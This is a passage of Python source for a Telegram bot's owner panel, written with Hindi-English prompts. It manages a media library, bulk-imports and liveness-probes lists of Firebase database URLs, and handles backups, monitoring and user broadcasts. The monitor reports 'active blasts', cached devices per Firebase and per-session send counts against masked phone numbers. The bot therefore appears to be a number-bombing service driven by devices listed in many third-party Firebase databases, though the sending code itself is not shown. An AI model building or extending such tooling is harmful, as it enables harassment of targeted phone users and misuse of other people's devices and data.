        f"🖼 Photos: <b>{photo_count}</b> | 📹 Videos: <b>{video_count}</b>\n\n"
        f"<i>Welcome message uses random media from this library (different per user).</i>",
        reply_markup=videos_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.add_video)
    await safe_edit(cq.message,
        f"{em(EMOJI_VIDEO, '📹')} <b>Add Media</b>\n\n"
        f"Photo ya Video bhejiyega (ya File ID/URL text mein bhi bhej sakte hain):",
        reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return

    media_type = None
    file_id = None

    if msg.photo:
        media_type = "photo"
        file_id = msg.photo[-1].file_id
    elif msg.video:
        media_type = "video"
        file_id = msg.video.file_id
    elif msg.document and msg.document.mime_type:
        if msg.document.mime_type.startswith("video"):
            media_type = "video"
            file_id = msg.document.file_id
        elif msg.document.mime_type.startswith("image"):
            media_type = "photo"
            file_id = msg.document.file_id
    elif msg.text:
        media_type = "video"
        file_id = msg.text.strip()

    if not file_id:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid Photo ya Video bhejiyega."), parse_mode="HTML")
        return

    await state.update_data(pending_media_type=media_type, pending_file_id=file_id)
    await state.set_state(S.add_media_spoiler_confirm)

    icon = "🖼" if media_type == "photo" else "📹"
    await msg.answer(
        q(
            f"{icon} <b>{'Photo' if media_type == 'photo' else 'Video'} received!</b>\n\n"
            f"Isko <b>spoiler</b> (blur) ke saath bhejna hai?"
        ),
        reply_markup=kb(
            [("🙈 Haan, Spoiler", "owner:videos:spoiler:yes"), ("👁 Nahi, Normal", "owner:videos:spoiler:no")],
            [(f"{sc('cancel')}", "owner:videos:menu")]
        ),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:videos:spoiler:yes", "owner:videos:spoiler:no"}))
async def owner_videos_spoiler_confirm(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return

    fsmd = await state.get_data()
    media_type = fsmd.get("pending_media_type")
    file_id    = fsmd.get("pending_file_id")

    if not file_id:
        await cq.answer("❌ Session expired, dobara try karein!", show_alert=True)
        await state.clear()
        return

    spoiler = cq.data.endswith(":yes")

    def _add(d):
        d.setdefault("videos", []).append({
            "type": media_type,
            "file_id": file_id,
            "spoiler": spoiler
        })

    atomic_update(_add)
    await state.clear()

    icon = "🖼" if media_type == "photo" else "📹"
    spoiler_txt = "🙈 Spoiler ON" if spoiler else "👁 Normal (No Spoiler)"
    await safe_edit(cq.message,
        f"{em(EMOJI_CHECK, '✅')} <b>{icon} Media Saved Successfully!</b>\n\n{spoiler_txt}",
        reply_markup=videos_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    try:
        idx = int(cq.data.split("owner:videos:del:")[1])
    except Exception:
        await cq.answer("❌ Invalid", show_alert=True)
        return
    videos = d.get("videos", [])
    if 0 <= idx < len(videos):
        videos.pop(idx)
        d["videos"] = videos
        save(d)
    await cq.answer("🗑 Removed!")
    await safe_edit(cq.message,
        f"{em(EMOJI_VIDEO, '📹')} <b>Media Manager</b>\n\nTotal: <b>{len(d.get('videos', []))}</b>",
        reply_markup=videos_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    d["videos"] = []
    save(d)
    await cq.answer("🗑 All media deleted!")
    await safe_edit(cq.message,
        f"{em(EMOJI_VIDEO, '📹')} <b>Media Manager</b>\n\nTotal: <b>0</b>",
        reply_markup=videos_menu_kb(d),
        parse_mode="HTML"
    )

# ===================== FIREBASE MANAGER (+ Active / Dead) =====================

@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.clear()
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0
    await safe_edit(cq.message,
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b> firebase(s)",
        reply_markup=fb_menu_kb(d, page),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase)
    await safe_edit(cq.message,
        f"{em(EMOJI_FIRE, '🔥')} <b>Add Single Firebase</b>\n\nFirebase URL bhejo:\n"
        f"<i>Format: Label | URL\nExample: MyApp | https://myapp.firebaseio.com</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1)
        label = parts[0].strip()
        url = parts[1].strip()
    else:
        url = text
        label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} URL must start with https://. Dobara bhejo:"), parse_mode="HTML")
        return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer(q(f"{em(EMOJI_WARNING, '⚠️')} Already added!"), reply_markup=fb_menu_kb(d), parse_mode="HTML")
        return
    fb_id = str(int(time.time()))
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        q(f"{em(EMOJI_CHECK, '✅')} <b>Firebase Added!</b>\n\n{em(EMOJI_STAR, '🏷')} {label}\n{em(EMOJI_GEAR, '🔗')} <code>{url}</code>"),
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase_file)
    await safe_edit(cq.message,
        f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add Firebase via TXT File</b>\n\n"
        f"Aap ek `.txt` file upload karein jisme Firebase URLs hon.\n\n"
        f"<b>Supported File Formats:</b>\n"
        f"• <code>https://myapp.firebaseio.com</code>\n"
        f"• <code>Label | https://myapp.firebaseio.com</code>\n\n"
        f"<i>Duplicate URLs auto-skip ho jayenge!</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return

    doc = msg.document
    if not (doc.file_name or "").endswith('.txt'):
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Sirf `.txt` file bhejiyega!"), parse_mode="HTML")
        return

    file_info = await msg.bot.get_file(doc.file_id)
    downloaded_file = await msg.bot.download_file(file_info.file_path)
    content = downloaded_file.read().decode('utf-8', errors='ignore')

    lines = content.splitlines()
    fbs = d.get("firebases", [])
    existing_urls = {fb["url"].rstrip("/") for fb in fbs}

    added_count = 0
    skipped_count = 0
    processed_in_file = set()

    for line in lines:
        line = line.strip()
        if not line:
            continue

        if "|" in line:
            parts = line.split("|", 1)
            label = parts[0].strip()
            url = parts[1].strip()
        else:
            url = line
            label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]

        if not (url.startswith("http://") or url.startswith("https://")):
            continue

        url = url.rstrip("/")

        if url in existing_urls or url in processed_in_file:
            skipped_count += 1
            continue

        processed_in_file.add(url)
        existing_urls.add(url)
        fb_id = str(int(time.time() * 1000) + random.randint(100, 999))
        fbs.append({
            "id": fb_id,
            "url": url,
            "label": label,
            "added_at": int(time.time())
        })
        added_count += 1

    d["firebases"] = fbs
    save(d)
    await state.clear()

    await msg.answer(
        q(
            f"{em(EMOJI_CHECK, '✅')} <b>Firebase TXT Processed!</b>\n\n"
            f"{em(EMOJI_FIRE, '🔥')} Successfully Added : <b>{added_count}</b>\n"
            f"{em(EMOJI_WARNING, '⚠️')} Skipped (Duplicates) : <b>{skipped_count}</b>\n"
            f"{em(EMOJI_STAR, '📊')} Total Firebase DBs  : <b>{len(fbs)}</b>"
        ),
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Kripya ek valid `.txt` document file upload karein!"), parse_mode="HTML")

# --- Add Only Active (single) ---
@R.callback_query(F.data == "owner:fb:add_active")
async def owner_fb_add_active_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase_active)
    await safe_edit(cq.message,
        f"{em(EMOJI_CHECK, '✅')} <b>Add Only Active Firebase</b>\n\n"
        f"URL bhejo (Label | URL supported).\n"
        f"Bot pehle probe karega — sirf live Firebase add hoga.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_active)
async def owner_fb_add_active_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1)
        label = parts[0].strip()
        url = parts[1].strip()
    else:
        url = text
        label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} URL must start with https://"), parse_mode="HTML")
        return
    url = url.rstrip("/")
    wait = await msg.answer(q(f"{em(EMOJI_GEAR, '⏳')} Probing <code>{url}</code>..."), parse_mode="HTML")
    alive = await probe_firebase_alive(url)
    try:
        await wait.delete()
    except Exception:
        pass
    if not alive:
        await state.clear()
        await msg.answer(
            q(f"{em(EMOJI_CROSS, '❌')} <b>Dead / unreachable</b>\n<code>{url}</code>\n\nNot added."),
            reply_markup=fb_menu_kb(d),
            parse_mode="HTML"
        )
        return
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer(q(f"{em(EMOJI_WARNING, '⚠️')} Already added!"), reply_markup=fb_menu_kb(d), parse_mode="HTML")
        return
    fb_id = str(int(time.time()))
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        q(f"{em(EMOJI_CHECK, '✅')} <b>Active Firebase Added!</b>\n\n{label}\n<code>{url}</code>"),
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

# --- Add Only Active via TXT ---
@R.callback_query(F.data == "owner:fb:add_active_file")
async def owner_fb_add_active_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase_active_file)
    await safe_edit(cq.message,
        f"{em(EMOJI_CHECK, '✅')} <b>Bulk Add ONLY Active (TXT)</b>\n\n"
        f"Upload `.txt` with URLs. Bot probes each line and keeps only live ones.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_active_file, F.document)
async def owner_fb_add_active_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    doc = msg.document
    if not (doc.file_name or "").endswith(".txt"):
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Sirf `.txt` file bhejiyega!"), parse_mode="HTML")
        return

    file_info = await msg.bot.get_file(doc.file_id)
    downloaded = await msg.bot.download_file(file_info.file_path)
    content = downloaded.read().decode("utf-8", errors="ignore")
    lines = [ln.strip() for ln in content.splitlines() if ln.strip()]

    wait = await msg.answer(q(f"{em(EMOJI_GEAR, '⏳')} Probing {len(lines)} URLs..."), parse_mode="HTML")

    fbs = d.get("firebases", [])
    existing = {fb["url"].rstrip("/") for fb in fbs}
    added = 0
    dead = 0
    skipped = 0

    for line in lines:
        if "|" in line:
            parts = line.split("|", 1)
            label = parts[0].strip()
            url = parts[1].strip()
        else:
            url = line
            label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]
        if not (url.startswith("http://") or url.startswith("https://")):
            continue
        url = url.rstrip("/")
        if url in existing:
            skipped += 1
            continue
        alive = await probe_firebase_alive(url, timeout=6.0)
        if not alive:
            dead += 1
            continue
        fb_id = str(int(time.time() * 1000) + random.randint(100, 999))
        fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
        existing.add(url)
        added += 1
        await asyncio.sleep(0.05)

    d["firebases"] = fbs
    save(d)
    await state.clear()
    try:
        await wait.delete()
    except Exception:
        pass
    await msg.answer(
        q(
            f"{em(EMOJI_CHECK, '✅')} <b>Active-only TXT done</b>\n\n"
            f"Added: <b>{added}</b>\n"
            f"Dead skipped: <b>{dead}</b>\n"
            f"Duplicates: <b>{skipped}</b>\n"
            f"Total DBs: <b>{len(fbs)}</b>"
        ),
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_active_file)
async def owner_fb_add_active_file_invalid(msg: Message):
    await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid `.txt` document bhejiyega."), parse_mode="HTML")

# --- Remove Dead ---
@R.callback_query(F.data == "owner:fb:remove_dead")
async def owner_fb_remove_dead(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fbs = d.get("firebases", [])
    if not fbs:
        await cq.answer("No firebases configured", show_alert=True)
        return
    await cq.answer("⏳ Scanning dead firebases...")
    alive_list = []
    dead_count = 0
    for fb in fbs:
        ok = await probe_firebase_alive(fb["url"], timeout=6.0)
        if ok:
            alive_list.append(fb)
        else:
            dead_count += 1
            # purge caches
            global CACHED_DEVICES, FB_DEVICE_COUNTS
            CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb["id"]]
            FB_DEVICE_COUNTS.pop(fb["id"], None)
        await asyncio.sleep(0.03)

    d["firebases"] = alive_list
    save(d)
    await safe_edit(cq.message,
        f"{em(EMOJI_CHECK, '✅')} <b>Dead Firebase Cleanup</b>\n\n"
        f"Removed dead: <b>{dead_count}</b>\n"
        f"Still active: <b>{len(alive_list)}</b>",
        reply_markup=fb_menu_kb(d, 0),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    parts = cq.data.split(":")
    fb_id = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0

    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    d = load()
    await safe_edit(cq.message,
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
        reply_markup=fb_menu_kb(d, page),
        parse_mode="HTML"
    )

# ===================== BACKUP MANAGER =====================

@R.callback_query(F.data == "owner:backup:menu")
async def owner_backup_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    cfg = d.get("backup", DEFAULT_BACKUP)
    last = cfg.get("last_backup_ts", 0)
    last_str = fmt_time(last) if last else "Never"
    text = (
        f"{em(EMOJI_GEAR, '📦')} <b>Backup Manager</b>\n\n"
        f"Status: {'🟢 ON' if cfg.get('enabled') else '🔴 OFF'}\n"
        f"Chat ID: <code>{cfg.get('chat_id')}</code>\n"
        f"Interval: <b>{cfg.get('interval_minutes', 60)} minutes</b>\n"
        f"Last backup: <b>{last_str}</b>\n\n"
        f"<i>Auto backups go to the private GC you set. Timing is fully under your control.</i>"
    )
    await safe_edit(cq.message, text, reply_markup=backup_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:backup:now")
async def owner_backup_now(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("📦 Sending backup...")
    ok = await do_backup_send(cq.bot, d, reason="manual")
    await cq.answer("✅ Backup sent!" if ok else "❌ Backup failed", show_alert=True)

@R.callback_query(F.data.in_({"owner:backup:on", "owner:backup:off"}))
async def owner_backup_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    enabled = cq.data.endswith(":on")
    def _t(dd):
        dd.setdefault("backup", DEFAULT_BACKUP.copy())
        dd["backup"]["enabled"] = enabled
    atomic_update(_t)
    await cq.answer(f"Auto backup {'ON' if enabled else 'OFF'}", show_alert=True)
    await owner_backup_menu(cq, state)

@R.callback_query(F.data == "owner:backup:set_chat")
async def owner_backup_set_chat_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.backup_set_chat)
    await safe_edit(cq.message,
        f"{em(EMOJI_BELL, '🔗')} <b>Set Backup Chat ID</b>\n\n"
        f"Private group / channel ID bhejo (e.g. -100xxxxxxxxxx).\n"
        f"Bot must be admin there.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:backup:menu")]),
        parse_mode="HTML"
    )

@R.message(S.backup_set_chat)
async def owner_backup_set_chat_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        chat_id = int(msg.text.strip())
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid numeric chat ID bhejo."), parse_mode="HTML")
        return
    def _s(dd):
        dd.setdefault("backup", DEFAULT_BACKUP.copy())
        dd["backup"]["chat_id"] = chat_id
    atomic_update(_s)
    await state.clear()
    await msg.answer(
        q(f"{em(EMOJI_CHECK, '✅')} Backup chat set to <code>{chat_id}</code>"),
        reply_markup=kb([(f"{sc('back')}", "owner:backup:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:backup:set_interval")
async def owner_backup_set_interval_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.backup_set_interval)
    await safe_edit(cq.message,
        f"{em(EMOJI_GEAR, '⏱')} <b>Set Backup Interval</b>\n\n"
        f"Minutes mein interval bhejo (min 5).\n"
        f"Examples: 60 = 1 hour, 360 = 6 hours, 1440 = 24 hours",
        reply_markup=kb([(f"{sc('cancel')}", "owner:backup:menu")]),
        parse_mode="HTML"
    )

@R.message(S.backup_set_interval)
async def owner_backup_set_interval_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        mins = int(msg.text.strip())
        if mins < 5:
            raise ValueError
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid number >= 5 bhejo."), parse_mode="HTML")
        return
    def _s(dd):
        dd.setdefault("backup", DEFAULT_BACKUP.copy())
        dd["backup"]["interval_minutes"] = mins
    atomic_update(_s)
    await state.clear()
    await msg.answer(
        q(f"{em(EMOJI_CHECK, '✅')} Interval set to <b>{mins}</b> minutes."),
        reply_markup=kb([(f"{sc('back')}", "owner:backup:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:backup:export_json")
async def owner_backup_export_json(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if not os.path.exists(_DATA_FILE):
        await cq.answer("No DB file", show_alert=True)
        return
    await cq.message.reply_document(
        document=FSInputFile(_DATA_FILE),
        caption=q(f"📤 <b>JSON Export</b> — {_VERSION}\n<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>"),
        parse_mode="HTML"
    )
    await cq.answer("✅ Sent")

@R.callback_query(F.data == "owner:backup:export_sqlite")
async def owner_backup_export_sqlite(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("⏳ Building SQLite dump...")
    try:
        blob = json_to_sqlite_bytes(d)
        fname = f"blast_db_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sql"
        await cq.message.reply_document(
            document=BufferedInputFile(blob, filename=fname),
            caption=q(f"📤 <b>SQLite Dump</b> — {_VERSION}"),
            parse_mode="HTML"
        )
    except Exception as e:
        await cq.answer(f"❌ {str(e)[:40]}", show_alert=True)

@R.callback_query(F.data == "owner:backup:import_json")
async def owner_backup_import_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.backup_import_file)
    await safe_edit(cq.message,
        f"{em(EMOJI_CHECK, '📥')} <b>Import JSON Database</b>\n\n"
        f"Upload a `.json` file that was previously exported from this bot.\n"
        f"<b>A pre-import backup will be created automatically.</b>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:backup:menu")]),
        parse_mode="HTML"
    )

@R.message(S.backup_import_file, F.document)
async def owner_backup_import_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    doc = msg.document
    name = (doc.file_name or "").lower()
    if not name.endswith(".json"):
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Sirf `.json` file bhejiyega."), parse_mode="HTML")
        return

    # safety backup first
    await do_backup_send(msg.bot, d, reason="pre-import")

    file_info = await msg.bot.get_file(doc.file_id)
    downloaded = await msg.bot.download_file(file_info.file_path)
    raw = downloaded.read().decode("utf-8", errors="ignore")
    try:
        incoming = json.loads(raw)
        if not isinstance(incoming, dict):
            raise ValueError("root must be object")
    except Exception as e:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Invalid JSON: {e}"), parse_mode="HTML")
        await state.clear()
        return

    # merge required keys
    default = _default_data()
    for k, v in default.items():
        if k not in incoming:
            incoming[k] = v
    if MAIN_OWNER not in incoming.get("owners", []):
        incoming["owners"].insert(0, MAIN_OWNER)

    save(incoming)
    global PROTECTED_NUMBERS
    PROTECTED_NUMBERS = incoming.get("protected_numbers", {})
    await state.clear()
    await msg.answer(
        q(
            f"{em(EMOJI_CHECK, '✅')} <b>Database Imported</b>\n\n"
            f"Users: <b>{len(incoming.get('users', {}))}</b>\n"
            f"Firebases: <b>{len(incoming.get('firebases', []))}</b>\n"
            f"Pre-import backup was sent to backup chat."
        ),
        reply_markup=kb([(f"{sc('back')}", "owner:backup:menu")]),
        parse_mode="HTML"
    )

@R.message(S.backup_import_file)
async def owner_backup_import_invalid(msg: Message):
    await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} JSON document upload karein."), parse_mode="HTML")

# ===================== MONITOR =====================

@R.callback_query(F.data == "owner:monitor")
async def owner_monitor(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    active = [s for s in USER_SESSIONS.values() if s.task and not s.task.done()]
    lines = [
        f"{em(EMOJI_STAR, '📡')} <b>Monitor / Admin Logs</b>\n",
        f"Active blasts: <b>{len(active)}</b>",
        f"Cached devices: <b>{len(CACHED_DEVICES)}</b>",
        f"Scanner: {get_scan_status()}",
        f"Health log entries: <b>{len(DEVICE_HEALTH_LOG)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        f"<b>Recent activity (last 15)</b>"
    ]
    for entry in reversed(d.get("activity_log", [])[-15:]):
        ts = fmt_time(entry.get("timestamp", 0))
        lines.append(f"[{ts}] <code>{entry.get('uid')}</code> — <b>{entry.get('action')}</b> — {entry.get('details', '')[:60]}")
    if active:
        lines.append("\n<b>Live sessions</b>")
        for s in active:
            lines.append(f"• UID <code>{s.uid}</code> → {mask_number(s.number or '?')} | sent {s.sent}")
    text = "\n".join(lines)
    if len(text) > 3900:
        text = text[:3890] + "\n..."
    await safe_edit(cq.message, text,
        reply_markup=kb([
            (f"{sc('refresh')}", "owner:monitor"),
            (f"{sc('back')}", "owner:home")
        ]),
        parse_mode="HTML"
    )

# ===================== PREMIUM BROADCAST =====================

@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(cq.message,
        f"{em(EMOJI_BELL, '📢')} <b>Premium Broadcast</b>\n\n"
        f"Jo message bhejni hai woh type karo <b>YA</b> kisi message ko reply karke yahan aao.\n\n"
        f"<i>Quote blocks, premium emoji aur entities copy_message se preserve ho jayenge.</i>",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    await state.clear()
    users = d.get("users", {})
    wait = await msg.answer(q(f"{em(EMOJI_BELL, '📤')} Broadcasting to <b>{len(users)}</b> users..."), parse_mode="HTML")
    ok = 0
    fail = 0

    # Prefer copy_message so premium emoji + quote entities stay intact
    source_msg = msg.reply_to_message if msg.reply_to_message else msg

    for uid_str in users:
        try:
            target = int(uid_str)
            try:
                await msg.bot.copy_message(
                    chat_id=target,
                    from_chat_id=source_msg.chat.id,
                    message_id=source_msg.message_id
                )
            except Exception:
                # fallback: plain text with quote wrapper
                body = source_msg.text or source_msg.caption or ""
                if body:
                    await msg.bot.send_message(target, q(body), parse_mode="HTML")
                else:
                    raise
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    try:
        await wait.delete()
    except Exception:
        pass
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        q(f"{em(EMOJI_CHECK, '✅')} <b>Broadcast Done!</b>\n\n{em(EMOJI_CHECK, '✅')} Delivered: <b>{ok}</b>\n{em(EMOJI_CROSS, '❌')} Failed: <b>{fail}</b>"),
        reply_markup=back_kb,
        parse_mode="HTML"
    )

@R.message(Command("broadcastbtn"))
async def cmd_broadcast_btn(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Admin only!"), parse_mode="HTML")
        return

    if not msg.reply_to_message:
        await msg.answer(
            q(
                f"{em(EMOJI_STAR, '⭐')} Reply to the message you want to broadcast.\n\n"
                f"Use:\n"
                f"<code>/broadcastbtn Button Text | https://example.com | success | EMOJI_ID</code>\n\n"
                f"Styles: primary (blue), success (green), danger (red)\n"
                f"Style and premium emoji ID are optional."
            ),
            parse_mode="HTML"
        )
        return

    parts = msg.text.split(maxsplit=1)
    if len(parts) < 2:
        await msg.answer(
            q(
                f"{em(EMOJI_CROSS, '❌')} Provide button details:\n\n"
                f"<code>/broadcastbtn Button Text | https://example.com | success | EMOJI_ID</code>"
            ),
            parse_mode="HTML"
        )
        return

    args = [p.strip() for p in parts[1].split("|")]
    if len(args) < 2:
        await msg.answer(
            q(
                f"{em(EMOJI_CROSS, '❌')} Invalid format. Use:\n\n"
                f"<code>/broadcastbtn Button Text | https://example.com | success | EMOJI_ID</code>"
            ),
            parse_mode="HTML"
        )
        return

    btn_text = args[0].strip()
    btn_link = args[1].strip()

    if not btn_text or not btn_link:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Button text and URL cannot be empty!"), parse_mode="HTML")
        return
    if not (btn_link.startswith("http://") or btn_link.startswith("https://") or btn_link.startswith("tg://")):
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} URL must start with http://, https:// or tg://"), parse_mode="HTML")
        return

    style = args[2].strip().lower() if len(args) > 2 and args[2].strip() else "primary"
    if style not in ("primary", "success", "danger"):
        style = "primary"
    emoji_id = args[3].strip() if len(args) > 3 and args[3].strip() else None

    button = btn_url(btn_text, btn_link, emoji_id, style=style)
